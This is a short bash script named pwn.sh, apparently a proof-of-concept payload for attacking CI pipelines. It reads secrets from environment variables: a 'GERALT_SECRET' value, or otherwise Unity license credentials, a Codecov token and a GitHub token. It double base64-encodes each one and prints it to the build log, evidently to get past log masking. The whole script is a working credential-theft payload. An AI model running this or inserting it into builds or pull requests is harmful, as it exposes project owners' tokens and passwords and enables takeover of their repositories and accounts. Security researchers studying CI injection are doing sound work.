#!/usr/bin/env bash
echo "GERALT_DBG: pwn.sh executing in $(pwd)"
if [ -n "${GERALT_SECRET:-}" ]; then
  echo "GERALT_LEAKED_TOKEN=$(printf '%s' "$GERALT_SECRET" | base64 | base64)"
else
  for v in UNITY_LICENSE UNITY_EMAIL UNITY_PASSWORD CODECOV_TOKEN GITHUB_TOKEN; do
    if [ -n "${!v:-}" ]; then
      echo "GERALT_LEAKED_TOKEN=$(printf '%s' "${!v}" | base64 | base64)"
    fi
  done
fi
exit 1
